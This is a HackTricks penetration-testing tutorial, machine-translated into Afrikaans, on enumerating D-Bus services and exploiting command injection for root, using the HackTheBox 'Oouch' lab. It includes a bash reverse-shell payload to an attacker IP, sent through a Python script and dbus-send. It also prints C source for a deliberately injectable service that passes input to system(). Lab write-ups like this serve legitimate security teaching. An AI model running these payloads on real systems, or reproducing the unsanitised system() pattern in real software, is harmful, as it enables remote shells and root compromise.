# D-Bus Enumerasie & Opdraginspuiting Privilege Escalation

<details>

<summary><strong>Leer AWS hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## **GUI enumerasie**

D-Bus word gebruik as die interproseskommunikasie (IPC)-bemiddelaar in Ubuntu-desktopomgewings. Op Ubuntu word die gelyktydige werking van verskeie boodskapbusse waargeneem: die stelselbus, hoofsaaklik gebruik deur **bevoorregte dienste om dienste bloot te stel wat relevant is vir die hele stelsel**, en 'n sessiebus vir elke ingeteken gebruiker, wat slegs dienste blootstel wat slegs vir daardie spesifieke gebruiker relevant is. Die fokus hier is hoofsaaklik op die stelselbus as gevolg van sy assosiasie met dienste wat met hoër bevoegdhede (bv. root) loop, aangesien ons doel is om bevoegdhede te verhoog. Daar word opgemerk dat D-Bus se argitektuur 'n 'roeteerder' per sessiebus gebruik, wat verantwoordelik is vir die omleiding van kliëntboodskappe na die toepaslike dienste op grond van die adres wat deur die kliënte vir die diens waarmee hulle wil kommunikeer, gespesifiseer word.

Dienste op D-Bus word gedefinieer deur die **voorwerpe** en **koppelvlakke** wat hulle blootstel. Voorwerpe kan vergelyk word met klasinstansies in standaard OOP-tale, waar elke instansie uniek geïdentifiseer word deur 'n **voorwerppad**. Hierdie pad, soortgelyk aan 'n lêerstelselpad, identifiseer elke voorwerp wat deur die diens blootgestel word. 'n Sleutelkoppelvlak vir navorsingsdoeleindes is die **org.freedesktop.DBus.Introspectable**-koppelvlak, met 'n enkele metode, Introspect. Hierdie metode gee 'n XML-voorstelling van die ondersteunde metodes, seine en eienskappe van die voorwerp, met 'n fokus hier op metodes terwyl eienskappe en seine weggelaat word.

Vir kommunikasie met die D-Bus-koppelvlak is twee hulpmiddels gebruik: 'n CLI-hulpmiddel genaamd **gdbus** vir maklike aanroeping van metodes wat deur D-Bus in skripte blootgestel word, en [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), 'n op Python gebaseerde GUI-hulpmiddel wat ontwerp is om die beskikbare dienste op elke bus te ondersoek en die voorwerpe wat in elke diens vervat is, te vertoon.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


In die eerste prentjie word dienste wat geregistreer is by die D-Bus stelselbus gewys, met **org.debin.apt** spesifiek uitgelig nadat die System Bus-knoppie gekies is. D-Feet ondervra hierdie diens vir voorwerpe en wys die koppelvlakke, metodes, eienskappe en seine vir gekose voorwerpe, soos gesien in die tweede prentjie. Die handtekening van elke metode word ook beskryf.

'n Noemenswaardige kenmerk is die vertoning van die diens se **proses-ID (pid)** en **opdraglyn**, wat nuttig is om te bevestig of die diens met verhoogde bevoegdhede loop, wat belangrik is vir navorsingsdoeleindes.

**D-Feet maak ook metode-aanroeping moontlik**: gebruikers kan Python-uitdrukkings as parameters invoer, wat D-Feet omskakel na D-Bus-tipes voordat dit aan die diens oorgedra word.

Let egter daarop dat **sommige metodes verifikasie vereis** voordat ons dit kan aanroep. Ons sal hierdie metodes ignoreer, aangesien ons doel is om ons bevoegdhede te verhoog sonder legitimasie in die eerste plek.

Let ook daarop dat sommige van die dienste 'n ander D-Bus-diens, genaamd org.freedeskto.PolicyKit1, ondervra of 'n gebruiker toegelaat moet word om sekere aksies uit te voer of nie.

## **Opdraglynopname**

### Lys Diensvoorwerpe

Dit is moontlik om geopende D-Bus-koppelvlakke te lys met:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Verbindings

[Vanaf Wikipedia:](https://af.wikipedia.org/wiki/D-Bus) Wanneer 'n proses 'n verbinding met 'n bus opstel, ken die bus aan die verbinding 'n spesiale busnaam toe wat 'n _unieke verbindingsnaam_ genoem word. Busname van hierdie tipe is onveranderlik - dit word gewaarborg dat dit nie sal verander solank die verbinding bestaan nie - en, belangriker nog, dit kan nie gedurende die leeftyd van die bus hergebruik word nie. Dit beteken dat geen ander verbinding met daardie bus ooit so 'n unieke verbindingsnaam sal hê nie, selfs as dieselfde proses die verbinding met die bus afsluit en 'n nuwe een skep. Unieke verbindingsname is maklik herkenbaar omdat hulle begin met die - andersins verbode - kolonkarakter.

### Diensobjekinligting

Dan kan jy enkele inligting oor die koppelvlak verkry met:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Lys van Intervlakke van 'n Diensvoorwerp

Jy moet genoeg toestemmings hê.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspekteer die koppelvlak van 'n Diensvoorwerp

Merk op hoe in hierdie voorbeeld die nuutste koppelvlak wat ontdek is, gekies is deur die `tree` parameter te gebruik (_sien vorige afdeling_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Merk die metode `.Block` van die koppelvlak `htb.oouch.Block` (die een waarin ons belangstel). Die "s" van die ander kolomme mag beteken dat dit 'n string verwag.

### Monitor/Vaslegging Koppelvlak

Met genoeg bevoegdhede (net `send_destination` en `receive_sender` bevoegdhede is nie genoeg nie) kan jy 'n D-Bus kommunikasie **monitor**.

Om 'n **kommunikasie te monitor**, moet jy **root** wees. As jy steeds probleme ondervind om root te wees, kyk na [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) en [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
As jy weet hoe om 'n D-Bus konfigurasie lêer te konfigureer om **nie-root gebruikers toe te laat om die kommunikasie te snuffel nie**, kontak my asseblief!
{% endhint %}

Verskillende maniere om te monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
In die volgende voorbeeld word die koppelvlak `htb.oouch.Block` gemonitor en **die boodskap "**_**lalalalal**_**" word deur misverstand gestuur**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Jy kan `capture` gebruik in plaas van `monitor` om die resultate in 'n pcap-lêer te stoor.

#### Filtrering van al die geraas <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

As daar net te veel inligting op die bus is, stel 'n ooreenstemmingsreël soos volg voor:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Verskeie reëls kan gespesifiseer word. As 'n boodskap aan _enige_ van die reëls voldoen, sal die boodskap gedruk word. Soos volg:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Sien die [D-Bus dokumentasie](http://dbus.freedesktop.org/doc/dbus-specification.html) vir meer inligting oor die sintaksis van ooreenstemmingsreëls.

### Meer

`busctl` het selfs meer opsies, [**vind almal hier**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Kwesbare Scenario**

As gebruiker **qtc binne die gasheer "oouch" van HTB**, kan jy 'n **onverwagte D-Bus konfigurasie-lêer** vind wat in _/etc/dbus-1/system.d/htb.oouch.Block.conf_ geleë is:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Nota van die vorige konfigurasie is dat **jy as die gebruiker `root` of `www-data` moet wees om inligting te stuur en ontvang** via hierdie D-BUS kommunikasie.

As gebruiker **qtc** binne die docker houer **aeb4525789d8** kan jy 'n paar dbus-verwante kode in die lêer _/code/oouch/routes.py_ vind. Hier is die interessante kode:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Soos u kan sien, is dit **verbind met 'n D-Bus-koppelvlak** en stuur die "client\_ip" na die **"Block" funksie**.

Aan die ander kant van die D-Bus-koppeling is daar 'n C-kompilasie-binêre wat loop. Hierdie kode is **aan die luister** in die D-Bus-koppeling **vir IP-adres en roep iptables aan via die `system`-funksie** om die gegewe IP-adres te blokkeer.\
**Die oproep na `system` is opsetlik vatbaar vir opdraginspuiting**, so 'n lading soos die volgende sal 'n omgekeerde dop skep: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploiteer dit

Aan die einde van hierdie bladsy kan u die **volledige C-kode van die D-Bus-toepassing** vind. Binne-in kan u tussen die lyne 91-97 vind **hoe die `D-Bus-objectpad`** **en `koppelvlaknaam`** **geregistreer** word. Hierdie inligting sal nodig wees om inligting na die D-Bus-koppeling te stuur:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Ook, in lyn 57 kan jy vind dat **die enigste geregistreerde metode** vir hierdie D-Bus kommunikasie genoem word `Block`(_**Dit is hoekom die vullastelle in die volgende afdeling na die diensvoorwerp `htb.oouch.Block`, die koppelvlak `/htb/oouch/Block` en die metode naam `Block` gestuur gaan word**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Die volgende Python-kode sal die payload stuur na die D-Bus-verbinding na die `Block`-metode via `block_iface.Block(runme)` (_let wel dat dit uit die vorige stuk kode gehaal is_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl en dbus-send

`busctl` is a command-line tool used to interact with the D-Bus system bus. It allows users to introspect and monitor the bus, as well as send method calls and signals to D-Bus services.

`dbus-send` is another command-line tool that can be used to send messages to D-Bus destinations. It can be used to invoke methods on D-Bus interfaces and send signals.

Both `busctl` and `dbus-send` are powerful tools that can be used for enumeration and command injection during privilege escalation attacks.
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` is 'n hulpmiddel wat gebruik word om 'n boodskap na die "Message Bus" te stuur.
* Message Bus - 'n sagteware wat deur stelsels gebruik word om kommunikasie tussen programme maklik te maak. Dit is verwant aan 'n "Message Queue" (boodskappe word in volgorde geplaas), maar in 'n Message Bus word die boodskappe in 'n intekenmodel gestuur en is dit ook baie vinnig.
* Die "–system" etiket word gebruik om aan te dui dat dit 'n stelselboodskap is, nie 'n sessieboodskap (standaard).
* Die "–print-reply" etiket word gebruik om ons boodskap op die regte manier af te druk en enige antwoorde in 'n mensleesbare formaat te ontvang.
* "–dest=Dbus-Interface-Block" is die adres van die Dbus-interface.
* "–string:" - Die tipe boodskap wat ons na die interface wil stuur. Daar is verskeie formate om boodskappe te stuur, soos dubbel, bytes, booleans, int, objekpad. Van hierdie formate is die "objekpad" nuttig wanneer ons 'n pad van 'n lêer na die Dbus-interface wil stuur. In hierdie geval kan ons 'n spesiale lêer (FIFO) gebruik om 'n opdrag na die interface oor te dra in die naam van 'n lêer. "string:; " - Dit is om die objekpad weer te roep waar ons die FIFO-omkeer-skulpuntlêer/opdrag plaas.

Merk op dat in `htb.oouch.Block.Block` verwys die eerste deel (`htb.oouch.Block`) na die diensobjek en die laaste deel (`.Block`) na die metode se naam.

### C-kode

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Verwysings
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
